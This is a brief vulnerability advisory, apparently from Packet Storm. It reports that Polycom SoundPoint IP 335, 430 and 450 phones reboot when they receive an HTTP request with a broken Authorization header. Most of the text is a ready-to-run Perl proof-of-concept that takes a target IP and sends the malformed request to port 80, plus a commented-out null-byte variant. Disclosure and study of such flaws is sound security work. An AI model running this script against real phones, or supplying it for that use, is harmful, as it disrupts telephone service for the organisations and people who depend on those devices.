Source:  http://packetstormsecurity.org/files/view/97948/polycomsoundpoint-dos.txt

Hello,

Polycom SoundPoint IP devices (IP phones) are vulnerable to Denial of 
Service attacks. Sending HTTP GET request with broken Authorization 
header effect a device restart after ~60 seconds.

It was tested on:

SoundPoint IP 335 (Version: 3.2.4.1734)
SoundPoint IP 430 (Version: 3.2.3.1734)
SoundPoint IP 450 (Version: 4.2.2.0710)

Proof Of Concept:
-----------------------------------------
#!/usr/bin/perl

use IO::Socket;
use strict;
use warnings;

if (!$ARGV[0]) {
         print "Usage: $0 [IP]\n";
         exit;
}

my $socket = IO::Socket::INET->new(
         Proto => "tcp",
         PeerAddr => "$ARGV[0]",
         PeerPort => "80") || die "Error $!";


print $socket "GET /reg_1.htm HTTP/1.1\r\nAuthorization: Basic\r\n\r\n";
#print $socket "GET /reg_1.htm HTTP/1.1\r\nAuthorization: Basic \0\r\n\r\n";
-----------------------------------------

-- 
best regards
pawel gawinek